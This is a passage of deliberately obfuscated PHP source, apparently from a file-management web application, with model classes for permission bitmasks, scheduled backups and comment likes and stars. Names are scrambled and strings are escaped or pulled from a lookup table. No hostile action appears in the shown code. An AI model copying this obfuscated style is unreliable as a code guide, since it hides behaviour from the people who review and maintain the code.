array($Í×Ç‰ñÄ[1504] => self::AUTH_SHOW, $Í×Ç‰ñÄ[1505] => self::AUTH_VIEW, $Í×Ç‰ñÄ[1326] => self::AUTH_DOWNLOAD, $Í×Ç‰ñÄ[118] => self::AUTH_UPLOAD, $Í×Ç‰ñÄ[1506] => self::AUTH_EDIT, $Í×Ç‰ñÄ[1275] => self::AUTH_REMOVE, $Í×Ç‰ñÄ[1507] => self::AUTH_SHARE, $Í×Ç‰ñÄ[439] => self::AUTH_COMMENT, $Í×Ç‰ñÄ[1508] => self::AUTH_EVENT, $Í×Ç‰ñÄ[1509] => self::AUTH_ROOT); if (!isset($ØÃœ×Ôş[$…ä©¡ ])) { return; } $˜ôûÓ¾œ = $ØÃœ×Ôş[$…ä©¡ ]; $ŸŠ±é´Ä = intval($ŸŠ±é´Ä); if ($ŸŠ±é´Ä <= 0) { return !1; } if (($ŸŠ±é´Ä & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ŸŠ±é´Ä & $˜ôûÓ¾œ); } public static function authDisable($•Ê¹Ğ×›, $¢™‡‡ƒø) { if (intval($•Ê¹Ğ×›) <= 0) { return 0; } return intval($•Ê¹Ğ×›) & ~$¢™‡‡ƒø; } public $optionType = "\123\x79\x73\164\145\x6d\56\163\157\165\x72\x63\x65\101\x75\x74\150\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\141\x75\x74\x68", "\154\x61\142\145\x6c", "\x64\x69\x73\x70\154\x61\171", "\x73\x79\x73\164\x65\155", "\163\157\162\x74"); public function initData() { $Ç§øÑ¡Å = $this->authDefault(); foreach ($Ç§øÑ¡Å as $ƒ¾ƒµà˜) { $this->add($ƒ¾ƒµà˜); } } public function findAuth($ôäÏÏ©á, $ÉÇ³©¼ı) { $ËˆÁ¹¬Ç =& $_SERVER[ŒÅŸ‹ä†]; $¥Û­Îû = parent::listData(); foreach ($¥Û­Îû as $»«Ş¹ß¦) { $½Í = intval($»«Ş¹ß¦[$ËˆÁ¹¬Ç[507]]); if ($½Í <= 0 || $»«Ş¹ß¦[$ËˆÁ¹¬Ç[2146]] == 0) { continue; } if (($½Í & $ôäÏÏ©á) != $ôäÏÏ©á) { continue; } if (($½Í & $ÉÇ³©¼ı) != 0) { continue; } return $»«Ş¹ß¦[$ËˆÁ¹¬Ç[492]]; } return !1; } public function findAuthMax($İšù¾îä, $ù”Ñßè¤) { $’¢ÀØÍƒ =& $_SERVER[ŒÅŸ‹ä†]; $œô’ãŠ = !1; $Õˆî„ = parent::listData(); foreach ($Õˆî„ as $Ÿ»Æîìœ) { $Æ†ÓäæÁ = intval($Ÿ»Æîìœ[$’¢ÀØÍƒ[507]]); if ($Æ†ÓäæÁ <= 0 || $Ÿ»Æîìœ[$’¢ÀØÍƒ[2146]] == 0) { continue; } if (($Æ†ÓäæÁ & $İšù¾îä) != $İšù¾îä) { continue; } if (($Æ†ÓäæÁ & $ù”Ñßè¤) != 0) { continue; } if (!$œô’ãŠ) { $œô’ãŠ = $Ÿ»Æîìœ; continue; } if (intval($œô’ãŠ[$’¢ÀØÍƒ[507]]) < $Æ†ÓäæÁ) { $œô’ãŠ = $Ÿ»Æîìœ; } } return $œô’ãŠ ? $œô’ãŠ[$’¢ÀØÍƒ[492]] : !1; } public function findAuthReadOnly() { $ÈÈ»™ß½ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $›ãìúæØ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÈÈ»™ß½, $›ãìúæØ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ÿ„äèÂ£ =& $_SERVER[ŒÅŸ‹ä†]; $ß©œ×ç = parent::listData(); $Ø£¯…Ä = !1; foreach ($ß©œ×ç as $æ§ÄÃ‘Ï) { if ($æ§ÄÃ‘Ï[$Ÿ„äèÂ£[507]] <= 0 || $æ§ÄÃ‘Ï[$Ÿ„äèÂ£[2146]] == $Ÿ„äèÂ£[239]) { continue; } if (!$Ø£¯…Ä) { $Ø£¯…Ä = $æ§ÄÃ‘Ï; continue; } if ($Ø£¯…Ä[$Ÿ„äèÂ£[507]] > $æ§ÄÃ‘Ï[$Ÿ„äèÂ£[507]]) { $Ø£¯…Ä = $æ§ÄÃ‘Ï; } } return $Ø£¯…Ä ? $Ø£¯…Ä[$Ÿ„äèÂ£[492]] : $Ÿ„äèÂ£[12]; } public function listData($şúÎøï¢ = false, $á™ì© = "\163\x6f\x72\164", $ÂŒãÎ†ˆ = false) { return parent::listData($şúÎøï¢, $á™ì©, $ÂŒãÎ†ˆ); } public function update($˜¤œù®­, $ÊÓ‰é´) { $²È¹Œö =& $_SERVER[ŒÅŸ‹ä†]; $ë×Ş®²ş = parent::listData($˜¤œù®­); $ğ‡àâµû = $this->findByName($ÊÓ‰é´[$²È¹Œö[42]]); if (!$ë×Ş®²ş || $ğ‡àâµû && $ğ‡àâµû[$²È¹Œö[492]] != $ë×Ş®²ş[$²È¹Œö[492]]) { return !1; } $this->filterAuth($ÊÓ‰é´[$²È¹Œö[507]]); return parent::update($˜¤œù®­, $ÊÓ‰é´); } public function remove($Ê±Ä•´Ê) { $ª“á’ê¨ = parent::listData($Ê±Ä•´Ê); if (!$ª“á’ê¨ || $ª“á’ê¨[$_SERVER[ŒÅŸ‹ä†][200]]) { return !1; } return parent::remove($Ê±Ä•´Ê); } public function add($ˆÎÇš¸Ú = array()) { $á—Ÿ´Œı =& $_SERVER[ŒÅŸ‹ä†]; if ($this->findByName($ˆÎÇš¸Ú[$á—Ÿ´Œı[42]])) { return !1; } $êÁ¡†»ı = array($á—Ÿ´Œı[42] => $á—Ÿ´Œı[12], $á—Ÿ´Œı[507] => 1, $á—Ÿ´Œı[2147] => $á—Ÿ´Œı[2136], $á—Ÿ´Œı[2146] => 1, $á—Ÿ´Œı[200] => 0, $á—Ÿ´Œı[2148] => 0); $ˆÎÇš¸Ú = array_merge($êÁ¡†»ı, $ˆÎÇš¸Ú); $ˆÎÇš¸Ú[$á—Ÿ´Œı[2148]] = $this->getSort(); $this->filterAuth($ˆÎÇš¸Ú[$á—Ÿ´Œı[507]]); return parent::insert($ˆÎÇš¸Ú); } private function getSort() { $Ú›±¸«Ü =& $_SERVER[ŒÅŸ‹ä†]; $â«£°¯´ = parent::listData(); $Œô¢ø† = array_to_keyvalue($â«£°¯´, $Ú›±¸«Ü[12], $Ú›±¸«Ü[2148]); return empty($Œô¢ø†) ? 0 : max($Œô¢ø†) + 1; } private function filterAuth(&$Û’’…¨) { if (!$Û’’…¨) { return; } $™¨Ù—¶¥ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Æ‹Í–š‡ = array(); foreach ($™¨Ù—¶¥ as $ÂİäüÄ³) { if ($Û’’…¨ & $ÂİäüÄ³) { $Æ‹Í–š‡[] = $ÂİäüÄ³; } } if (in_array(self::AUTH_ROOT, $Æ‹Í–š‡)) { $Û’’…¨ = array_sum($™¨Ù—¶¥); return; } $°¦úÒÕ£ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Æ‹Í–š‡ as $ÂİäüÄ³) { if (isset($°¦úÒÕ£[$ÂİäüÄ³])) { $Æ‹Í–š‡ = array_merge($Æ‹Í–š‡, $°¦úÒÕ£[$ÂİäüÄ³]); } } $Æ‹Í–š‡[] = self::AUTH_SHOW; $Û’’…¨ = array_sum(array_unique($Æ‹Í–š‡)); } public function sort($ ÁÆ‡¿‡, $Ğ‘şØ·´) { return parent::update($ ÁÆ‡¿‡, $Ğ‘şØ·´); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\142\x61\143\153\x75\160\x4c\151\x73\164"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\x73\164\x61\x74\x75\x73", "\x63\157\156\x74\x65\156\164", "\155\x61\x6e\x75\x61\x6c", "\x72\145\x73\165\x6c\164", "\164\151\x6d\x65\106\x72\x6f\x6d", "\x74\151\x6d\x65\x54\157"); public function config() { $Õ»É÷÷¨ =& $_SERVER[ŒÅŸ‹ä†]; Action($Õ»É÷÷¨[2149])->taskInit(); $úÚä£ñ× = Model($Õ»É÷÷¨[869])->get($Õ»É÷÷¨[876]); $úÚä£ñ× = json_decode($úÚä£ñ×, !0); $úÚä£ñ× = is_array($úÚä£ñ×) ? $úÚä£ñ× : array(); $this->parseContent($úÚä£ñ×); unset($úÚä£ñ×[$Õ»É÷÷¨[1890]]); Model($Õ»É÷÷¨[1889])->cacheClear(); $å‹Ä°×¡ = $Õ»É÷÷¨[2150]; $•ë’¶ = Model($Õ»É÷÷¨[2151])->findByKey($Õ»É÷÷¨[1508], $å‹Ä°×¡); if (!$•ë’¶) { $•ë’¶ = array(); } if (isset($•ë’¶[$Õ»É÷÷¨[215]])) { $•ë’¶[$Õ»É÷÷¨[215]] = json_decode($•ë’¶[$Õ»É÷÷¨[215]], !0); } if (isset($úÚä£ñ×[$Õ»É÷÷¨[215]])) { $•ë’¶[$Õ»É÷÷¨[215]][$Õ»É÷÷¨[1893]] = $úÚä£ñ×[$Õ»É÷÷¨[215]]; unset($úÚä£ñ×[$Õ»É÷÷¨[215]]); } return array_merge($•ë’¶, $úÚä£ñ×); } public function listData($µÛ“Ï¦÷ = false, $œÑ®ŸÓ¼ = "\x6d\x6f\x64\x69\146\171\x54\x69\x6d\145", $ôä­®î» = false) { $ıúØÅˆì = parent::listData($µÛ“Ï¦÷, $œÑ®ŸÓ¼, !0); if (!$ıúØÅˆì) { return $ıúØÅˆì; } if ($µÛ“Ï¦÷) { $ıúØÅˆì = array($ıúØÅˆì); } foreach ($ıúØÅˆì as &$Şıô²¬í) { $this->parseContent($Şıô²¬í); } return $µÛ“Ï¦÷ ? $ıúØÅˆì[0] : $ıúØÅˆì; } public function parseContent(&$ı›ÚşÅ) { $Îø³›ç† =& $_SERVER[ŒÅŸ‹ä†]; $Õ÷‚ß¨ = _get($ı›ÚşÅ, $Îø³›ç†[179], $Îø³›ç†[101]); if (!in_array($Õ÷‚ß¨, array($Îø³›ç†[875], $Îø³›ç†[1249]))) { $ı›ÚşÅ[$Îø³›ç†[179]] = $Õ÷‚ß¨ == $Îø³›ç†[101] ? $Îø³›ç†[1249] : $Îø³›ç†[875]; } } public function lastItem() { $ÓŞù·‡á = $this->listData(); return !empty($ÓŞù·‡á[0]) ? $ÓŞù·‡á[0] : null; } public function kill($ÄÒ‚Óı) { $êÌúÏÉé =& $_SERVER[ŒÅŸ‹ä†]; $Ë£Öî“© = $this->listData($ÄÒ‚Óı); if (!$Ë£Öî“© || empty($Ë£Öî“©[$êÌúÏÉé[42]])) { return !0; } Task::kill($êÌúÏÉé[884]); Task::kill($êÌúÏÉé[905]); Task::kill($êÌúÏÉé[913]); $â„İ’»’ = $Ë£Öî“©[$êÌúÏÉé[42]]; $×Ñ·áê = TEMP_FILES . $êÌúÏÉé[879] . $â„İ’»’ . $êÌúÏÉé[8]; IO::remove($×Ñ·áê, !1); return $this->remove($ÄÒ‚Óı); } public function remove($Ğ§†Æñš) { $¢ÇûÈÃŒ = $this->listData($Ğ§†Æñš); if (!$¢ÇûÈÃŒ) { return !0; } return $this->backupRemove($¢ÇûÈÃŒ); } private function backupRemove($ŠÏŒÖï) { parent::remove($ŠÏŒÖï[$_SERVER[ŒÅŸ‹ä†][492]]); $ö„ØŸõŒ = $this->backupPath($ŠÏŒÖï); IO::remove($ö„ØŸõŒ, !1); return !0; } private function backupPath($»Øà¼Êû) { $ëáÌ‡Şå =& $_SERVER[ŒÅŸ‹ä†]; $‹¶¶ìÊ = $»Øà¼Êû[$ëáÌ‡Şå[42]]; $ÍŒÂœŠß = Model($ëáÌ‡Şå[869])->get($ëáÌ‡Şå[870]); $™ªÍ¦¬Ü = substr(md5($ëáÌ‡Şå[871] . $ÍŒÂœŠß . $‹¶¶ìÊ), 0, 8); return "\173\x69\x6f\x3a{$»Øà¼Êû[$ëáÌ‡Şå[848]]}\175\x2f\x64\x61\x74\141\x62\141\x73\x65\57\142\141\143\153\165\x70\x2f" . $‹¶¶ìÊ . $ëáÌ‡Şå[11] . $™ªÍ¦¬Ü; } public function start() { $Ó”¢ü¸ª =& $_SERVER[ŒÅŸ‹ä†]; if ($GLOBALS[$Ó”¢ü¸ª[6]][$Ó”¢ü¸ª[102]][$Ó”¢ü¸ª[2152]] != $Ó”¢ü¸ª[101]) { return !0; } $¢¯ã¢‘ = $this->config(); if (!$¢¯ã¢‘ || $¢¯ã¢‘[$Ó”¢ü¸ª[1890]] != $Ó”¢ü¸ª[101]) { return !1; } if ($¢¯ã¢‘[$Ó”¢ü¸ª[179]] == $Ó”¢ü¸ª[875]) { $™Ğ°ƒâÅ = Model($Ó”¢ü¸ª[869])->get($Ó”¢ü¸ª[1371]); if ($™Ğ°ƒâÅ == $Ó”¢ü¸ª[1372]) { $¢¯ã¢‘[$Ó”¢ü¸ª[179]] = $Ó”¢ü¸ª[1249]; } } $š‰òšóú = $this->process(); foreach ($š‰òšóú as $Ûå°¨÷) { if ($Ûå°¨÷) { return Task::restart($Ûå°¨÷[$Ó”¢ü¸ª[492]]); } } $äĞ«£öÜ = new Backup(); $ñíí¸› = $äĞ«£öÜ->db(); if ($ñíí¸›) { $ñíí¸› = $äĞ«£öÜ->dbFile(); if ($ñíí¸› && $¢¯ã¢‘[$Ó”¢ü¸ª[179]] == $Ó”¢ü¸ª[875]) { $ñíí¸› = $äĞ«£öÜ->file(); } } Backup::set(array($Ó”¢ü¸ª[846] => 1, $Ó”¢ü¸ª[858] => time())); return !0; } public function process() { $¼ßÈß´» =& $_SERVER[ŒÅŸ‹ä†]; $¨®á•å = array($¼ßÈß´»[854] => Task::get($¼ßÈß´»[884]), $¼ßÈß´»[859] => Task::get($¼ßÈß´»[905]), $¼ßÈß´»[241] => Task::get($¼ßÈß´»[913])); $¥Ø†½ô— = !1; foreach ($¨®á•å as &$ßÜ‹è¹à) { if ($¥Ø†½ô—) { $ßÜ‹è¹à = !1; continue; } if ($ßÜ‹è¹à) { $ù®º†°³ = intval(_get($ßÜ‹è¹à, $¼ßÈß´»[1924], 0)); if (time() - $ù®º†°³ > 7200) { Task::kill($ßÜ‹è¹à[$¼ßÈß´»[492]]); $¥Ø†½ô— = !0; $ßÜ‹è¹à = !1; } } } return $¨®á•å; } public function restore() { $«Ù÷»»Û =& $_SERVER[ŒÅŸ‹ä†]; ActionCall($«Ù÷»»Û[2153], !0, 1); ActionCall($«Ù÷»»Û[2153], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\x6d\145" => "\143\x6f\x6d\155\145\156\164\x5f\x6d\145\164\141", "\155\x65\164\x61\x46\x69\145\154\144" => "\x63\x6f\155\155\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ş‘Ÿ»õÀ) { $Æ´Îºùƒ =& $_SERVER[ŒÅŸ‹ä†]; if ($ş‘Ÿ»õÀ[$Æ´Îºùƒ[2154]]) { $ÌõÁ¹ÛÙ = $this->where(array($Æ´Îºùƒ[2155] => $ş‘Ÿ»õÀ[$Æ´Îºùƒ[2154]]))->find(); if (!$ÌõÁ¹ÛÙ || $ÌõÁ¹ÛÙ[$Æ´Îºùƒ[199]] != $ş‘Ÿ»õÀ[$Æ´Îºùƒ[199]] || $ÌõÁ¹ÛÙ[$Æ´Îºùƒ[594]] != $ş‘Ÿ»õÀ[$Æ´Îºùƒ[594]]) { return !1; } $this->where(array($Æ´Îºùƒ[2155] => $ş‘Ÿ»õÀ[$Æ´Îºùƒ[2154]]))->setAdd($Æ´Îºùƒ[2156], 1); } $ş‘Ÿ»õÀ[$Æ´Îºùƒ[2157]] = 0; $ş‘Ÿ»õÀ[$Æ´Îºùƒ[2156]] = 0; $ş‘Ÿ»õÀ[$Æ´Îºùƒ[846]] = 1; return $this->add($ş‘Ÿ»õÀ); } public function commentCount($ÕĞ­åº, $¯Îò«Ò, $Â„´ñ„ = false) { $œß–æıÁ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ÕĞ­åº) { return array(); } if (is_string($ÕĞ­åº) || is_int($ÕĞ­åº)) { $ÕĞ­åº = array($ÕĞ­åº); } $€»ˆ¤¹û = array($œß–æıÁ[594], $œß–æıÁ[2158] => $œß–æıÁ[590]); $°…Ş©óê = array($œß–æıÁ[594] => array($œß–æıÁ[7], $ÕĞ­åº), $œß–æıÁ[199] => $¯Îò«Ò); if ($Â„´ñ„) { $°…Ş©óê[$œß–æıÁ[1537]] = $Â„´ñ„; } $ƒ—éÃ’¹ = $this->field($€»ˆ¤¹û)->where($°…Ş©óê)->group($œß–æıÁ[594])->select(); return array_to_keyvalue($ƒ—éÃ’¹, $œß–æıÁ[594], $œß–æıÁ[590]); } public function starTarget($·íßÏì, $¶¬«Òòª) { $ÓÖêâÄ· =& $_SERVER[ŒÅŸ‹ä†]; $ƒïÉ©ƒ® = $·íßÏì + self::TYPE_STAR_OFFSET; $æşÄŞ¿ = array($ÓÖêâÄ·[1537] => USER_ID, $ÓÖêâÄ·[199] => $ƒïÉ©ƒ®, $ÓÖêâÄ·[594] => $¶¬«Òòª); $õ¡÷éæ¥ = $this->where($æşÄŞ¿)->find(); if ($õ¡÷éæ¥) { return $this->where(array($ÓÖêâÄ·[492] => $õ¡÷éæ¥[$ÓÖêâÄ·[492]]))->delete(); } $Û®éŞØ‰ = array($ÓÖêâÄ·[2154] => 0, $ÓÖêâÄ·[1537] => USER_ID, $ÓÖêâÄ·[846] => 1, $ÓÖêâÄ·[179] => $ÓÖêâÄ·[12], $ÓÖêâÄ·[199] => $ƒïÉ©ƒ®, $ÓÖêâÄ·[594] => $¶¬«Òòª, $ÓÖêâÄ·[2157] => 0, $ÓÖêâÄ·[2156] => 0); return $this->add($Û®éŞØ‰); } public function starTargetCount($Øö­İˆŸ, $¯ó£öÉÜ) { $¥Œ¶¸¹˜ =& $_SERVER[ŒÅŸ‹ä†]; $ÌÎÊõƒß = $¯ó£öÉÜ + self::TYPE_STAR_OFFSET; $½®ì¡€¼ = $this->commentCount($Øö­İˆŸ, $ÌÎÊõƒß); $  ¨ÏáŸ = $this->commentCount($Øö­İˆŸ, $ÌÎÊõƒß, USER_ID); return array($¥Œ¶¸¹˜[2159] => $½®ì¡€¼, $¥Œ¶¸¹˜[2160] => $  ¨ÏáŸ); } public function starTargetUserList($¥’ÎšÒí, $ˆ€Á “§) { $Æä´º› =& $_SERVER[ŒÅŸ‹ä†]; $û´‚…×Ò = $¥’ÎšÒí + self::TYPE_STAR_OFFSET; $é·Åôôá = array($Æä´º›[594] => $ˆ€Á “§, $Æä´º›[199] => $û´‚…×Ò); $öè†¼ƒ÷ = $this->where($é·Åôôá)->count(); $õë¯é°à = array($Æä´º›[342] => $öè†¼ƒ÷, $Æä´º›[2161] => array()); if (!$öè†¼ƒ÷) { return $õë¯é°à; } $øµŠ¯„î = $this->field($Æä´º›[1537])->where($é·Åôôá)->limit(500)->select(); $øµŠ¯„î = array_to_keyvalue($øµŠ¯„î, $Æä´º›[12], $Æä´º›[1537]); $õë¯é°à[$Æä´º›[2161]] = Model($Æä´º›[602])->userListInfo($øµŠ¯„î); return $õë¯é°à; } public function prasiseUserList($øÂøËš ) { $´ßÀì‰¤ =& $_SERVER[ŒÅŸ‹ä†]; $¯ãéºÓ‰ = array($´ßÀì‰¤[2162] => $øÂøËš ); $×Òø¥¿ = $this->where($¯ãéºÓ‰)->find(); $Š›Œø÷Õ = _get($×Òø¥¿, $´ßÀì‰¤[2157], 0); $Ñ½ŒúĞ¦ = array($´ßÀì‰¤[342] => $Š›Œø÷Õ, $´ßÀì‰¤[2161] => array()); if (!$Š›Œø÷Õ) { return $Ñ½ŒúĞ¦; } $½öŒıÒ¤ = Model($´ßÀì‰¤[2163])->field($´ßÀì‰¤[1537])->where($¯ãéºÓ‰)->limit(500)->select(); $½öŒıÒ¤ = array_to_keyvalue($½öŒıÒ¤, $´ßÀì‰¤[12], $´ßÀì‰¤[1537]); $Ñ½ŒúĞ¦[$´ßÀì‰¤[2161]] = Model($´ßÀì‰¤[602])->userListInfo($½öŒıÒ¤); return $Ñ½ŒúĞ¦; } public function remove($ÔëŒƒ÷) { $×ÆÀ¨òÙ =& $_SERVER[ŒÅŸ‹ä†]; $éÏÆ•× = array($×ÆÀ¨òÙ[2155] => $ÔëŒƒ÷); $¥ŸˆÌÌÌ = $this->where($éÏÆ•×)->find(); if ($¥ŸˆÌÌÌ[$×ÆÀ¨òÙ[2154]]) { $this->where(array($×ÆÀ¨òÙ[2155] => $¥ŸˆÌÌÌ[$×ÆÀ¨òÙ[2154]]))->setAdd($×ÆÀ¨òÙ[2156], -1); } return $this->removeArray($ÔëŒƒ÷); } public function edit($Ø€¢ˆËÃ, $ûÓ±„¤) { $ÓÀ½İÃ =& $_SERVER[ŒÅŸ‹ä†]; $÷îøë²Ù = array($ÓÀ½İÃ[2155] => $Ø€¢ˆËÃ); return $this->where($÷îøë²Ù)->save(array($ÓÀ½İÃ[2164] => $ûÓ±„¤)); } public function prasise($õÒÓé¯Ã) { $Áìêùßø =& $_SERVER[ŒÅŸ‹ä†]; $´­Â­şİ = Model($Áìêùßø[2165]); $¯¦Ëõ¥ã = array($Áìêùßø[2155] => $õÒÓé¯Ã, $Áìêùßø[1911] => USER_ID); $¬˜ó¨¡” = $´­Â­şİ->where($¯¦Ëõ¥ã)->find(); if (!$¬˜ó¨¡”) { $´­Â­şİ->add($¯¦Ëõ¥ã); $òğï®Óü = $this->where(array($Áìêùßø[2155] => $õÒÓé¯Ã))->setAdd($Áìêùßø[2157], 1); } else { $´­Â­şİ->where($¯¦Ëõ¥ã)->delete(); $òğï®Óü = $this->where(array($Áìêùßø[2155] => $õÒÓé¯Ã))->setAdd($Áìêùßø[2157], -1); } return $òğï®Óü; } public function targetInfo($Çõ¢øáÙ, $½åŸ¬Û) { $‚§²Ìµ =& $_SERVER[ŒÅŸ‹ä†]; $¥©Ö”ûœ = array($‚§²Ìµ[676] => $Çõ¢øáÙ, $‚§²Ìµ[677] => $½åŸ¬Û); $†”ÙØâ” = $this->where($¥©Ö”ûœ)->count(); $º•÷«£Ç = "\122\111\107\x48\x54\40\112\117\111\116\x20{$this->tablePrefix}\x63\x6f\155\155\145\x6e\164\x5f\x70\x72\141\151\163\145\40\163\164\141\162\40\157\156\40\x63\157\x6d\155\x65\x6e\164\56\x63\x6f\155\155\145\x6e\164\x49\x44\x20\x3d\x20\163\x74\141\x72\x2e\143\157\x6d\155\145\x6e\x74\111\104"; $´À‚£‹² = $this->alias($‚§²Ìµ[439])->where($¥©Ö”ûœ)->join($º•÷«£Ç, $‚§²Ìµ[2166])->count(); $È„½ì­  = array($‚§²Ìµ[2167] => $†”ÙØâ”, $‚§²Ìµ[2168] => $´À‚£‹²); return $È„½ì­ ; } public function listData($ÃËØ¾) { $íï¥„•Ï =& $_SERVER[ŒÅŸ‹ä†]; if (isset($ÃËØ¾[$íï¥„•Ï[2169]])) { if ($ÃËØ¾[$íï¥„•Ï[2169]]) { $ÃËØ¾[$íï¥„•Ï[2162]] = array($íï¥„•Ï[1125], intval($ÃËØ¾[$íï¥„•Ï[2169]])); } unset($ÃËØ¾[$íï¥„•Ï[2169]]); } if (isset($ÃËØ¾[$íï¥„•Ï[2170]])) { if ($ÃËØ¾[$íï¥„•Ï[2170]]) { $ÃËØ¾[$íï¥„•Ï[2162]] = array($íï¥„•Ï[1122], intval($ÃËØ¾[$íï¥„•Ï[2170]])); } unset($ÃËØ¾[$íï¥„•Ï[2170]]); } return $this->_listData($ÃËØ¾); } private function _listData($æÓ§¬ÁÊ) { $´Ã¿«ˆ =& $_SERVER[ŒÅŸ‹ä†]; $«Ğë¥µß = $this->where($æÓ§¬ÁÊ)->_makeOrder()->selectPage(100); $this->_listAppendParent($«Ğë¥µß[$´Ã¿«ˆ[455]]); $this->_listAppendUser($«Ğë¥µß[$´Ã¿«ˆ[455]]); $this->_listAppendMeta($«Ğë¥µß[$´Ã¿«ˆ[455]]); return $«Ğë¥µß; } private function _makeOrder() { $Ÿ˜ğƒØ =& $_SERVER[ŒÅŸ‹ä†]; $¿ºì•ˆ = array($Ÿ˜ğƒØ[2157], $Ÿ˜ğƒØ[2156], $Ÿ˜ğƒØ[242]); $‘ã¾¨Ù = Input::get($Ÿ˜ğƒØ[549], $Ÿ˜ğƒØ[7], $Ÿ˜ğƒØ[517], $¿ºì•ˆ); $áÈ§úöé = Input::get($Ÿ˜ğƒØ[550], $Ÿ˜ğƒØ[7], $Ÿ˜ğƒØ[1913], array($Ÿ˜ğƒØ[2171], $Ÿ˜ğƒØ[545])); $Ä•Ì¼êè = $‘ã¾¨Ù . $Ÿ˜ğƒØ[63] . $áÈ§úöé; return $this->order($Ä•Ì¼êè); } private function _listAppendParent(&$÷ë¿æ ) { $ÕÚ¨´… =& $_SERVER[ŒÅŸ‹ä†]; $·ª·ßşŞ = array_unique(array_to_keyvalue($÷ë¿æ , $ÕÚ¨´…[12], $ÕÚ¨´…[2154])); $·ª·ßşŞ = array_remove_value($·ª·ßşŞ, $ÕÚ¨´…[239]); if (!$·ª·ßşŞ) { return; } $ é¹° = $this->where(array($ÕÚ¨´…[2155] => array($ÕÚ¨´…[7], $·ª·ßşŞ)))->select(); $ é¹° = array_to_keyvalue($ é¹°, $ÕÚ¨´…[2162]); foreach ($÷ë¿æ  as &$„¥¶¨Ìİ) { if (isset($ é¹°[$„¥¶¨Ìİ[$ÕÚ¨´…[2154]]])) { $„¥¶¨Ìİ[$ÕÚ¨´…[2172]] = $ é¹°[$„¥¶¨Ìİ[$ÕÚ¨´…[2154]]]; } } unset($„¥¶¨Ìİ); } private function _listAppendUser(&$Ñ•İïÆ¬) { $ô‚î =& $_SERVER[ŒÅŸ‹ä†]; $°ì¼ á… = array_unique(array_to_keyvalue($Ñ•İïÆ¬, $ô‚î[12], $ô‚î[1537])); $°ì¼ á… = array_remove_value($°ì¼ á…, $ô‚î[239]); if (count($°ì¼ á…) == 0) { return; } foreach ($Ñ•İïÆ¬ as $·±°ÜÖ) { if (isset($·±°ÜÖ[$ô‚î[2172]])) { $°ì¼ á…[] = $·±°ÜÖ[$ô‚î[2172]][$ô‚î[1537]]; } } $†ÉÂ³Ø» = Model($ô‚î[622])->userListInfo($°ì¼ á…); foreach ($Ñ•İïÆ¬ as &$·±°ÜÖ) { $·±°ÜÖ[$ô‚î[690]] = $†ÉÂ³Ø»[$·±°ÜÖ[$ô‚î[1537]]]; if (isset($·±°ÜÖ[$ô‚î[2172]])) { $·±°ÜÖ[$ô‚î[2172]][$ô‚î[690]] = $†ÉÂ³Ø»[$·±°ÜÖ[$ô‚î[2172]][$ô‚î[1537]]]; } } unset($·±°ÜÖ); } private function _listAppendMeta(&$ß¦ĞµÆ¡) { $±£¦‹÷ï =& $_SERVER[ŒÅŸ‹ä†]; $×“Œ †ç = array_unique(array_to_keyvalue($ß¦ĞµÆ¡, $±£¦‹÷ï[12], $±£¦‹÷ï[2162])); $×“Œ †ç = array_remove_value($×“Œ †ç, $±£¦‹÷ï[239]); if (!$×“Œ †ç) { return; } foreach ($ß¦ĞµÆ¡ as $£Ï”Óêª) { if (isset($£Ï”Óêª[$±£¦‹÷ï[2172]])) { $×“Œ †ç[] = $£Ï”Óêª[$±£¦‹÷ï[2172]][$±£¦‹÷ï[2162]]; } } $–Ğ®Û‰ = $this->metaList($×“Œ †ç); if (!$–Ğ®Û‰) { return !1; } foreach ($ß¦ĞµÆ¡ as &$£Ï”Óêª) { $£Ï”Óêª[$±£¦‹÷ï[560]] = $–Ğ®Û‰[$£Ï”Óêª[$±£¦‹÷ï[2162]]]; if (isset($£Ï”Óêª[$±£¦‹÷ï[2172]])) { $£Ï”Óêª[$±£¦‹÷ï[2172]][$±£¦‹÷ï[560]] = $–Ğ®Û‰[$£Ï”Óêª[$±£¦‹÷ï[2172]][$±£¦‹÷ï[2162]]]; } } unset($£Ï”Óêª); } private function metaList($ĞË÷ÆÊ£) { $ÓÙ¢àîï =& $_SERVER[ŒÅŸ‹ä†]; if (!$ĞË÷ÆÊ£) { return array(); } $¿¶Õ‡Çö = array($ÓÙ¢àîï[2162] => array($ÓÙ¢àîï[7], $ĞË÷ÆÊ£)); $àÜ×ä€ = Model($ÓÙ¢àîï[2173])->where($¿¶Õ‡Çö)->select(); $àÜ×ä€ = array_to_keyvalue_group($àÜ×ä€, $ÓÙ¢àîï[2162]); foreach ($àÜ×ä€ as $ªŒ°¨µ => $øúîÏ) { $«Ê»²­ = array(); foreach ($øúîÏ as $ù­”™§Ä) { $«Ê»²­[$ù­”™§Ä[$ÓÙ¢àîï[105]]] = $ù­”™§Ä[$ÓÙ¢àîï[460]]; } $àÜ×ä€[$ªŒ°¨µ] = $«Ê»²­; } return $àÜ×ä€ ? $àÜ×ä€ : array(); } public function 